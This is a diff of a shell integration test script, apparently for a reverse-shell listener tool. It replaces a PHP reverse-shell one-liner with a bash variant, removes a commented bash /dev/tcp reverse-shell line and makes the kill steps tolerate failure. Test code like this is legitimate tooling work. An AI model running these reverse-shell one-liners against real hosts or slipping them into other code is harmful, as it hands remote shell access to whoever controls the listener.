@@ -87,8 +87,7 @@ run_test() {
 	# Start Client
 	print_info "Start Client"
 	# shellcheck disable=SC2086
-	if ! cli_pid="$( run_bg "" "php" -r "\$sock=fsockopen(\"${RHOST}\",${RPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");" "${cli_stdout}" "${cli_stderr}" )"; then
-	#if ! cli_pid="$( run_bg "" "" "bash" "-i" ">&" "/dev/tcp/${RHOST}/${RPORT}" "0>&1" "${cli_stdout}" "${cli_stderr}" )"; then
+	if ! cli_pid="$( run_bg "" "php" -r "\$sock=fsockopen(\"${RHOST}\",${RPORT});exec(\"/bin/bash -i <&3 >&3 2>&3\");" "${cli_stdout}" "${cli_stderr}" )"; then
 		printf ""
 	fi
 
@@ -125,8 +124,8 @@ run_test() {
 	# --------------------------------------------------------------------------------
 	print_h2 "(4/8) Stop: Instances"
 
-	run "kill ${cli_pid}"
-	run "kill ${srv_pid}"
+	run "kill ${cli_pid} || true"
+	run "kill ${srv_pid} || true"
 
 
 	# --------------------------------------------------------------------------------
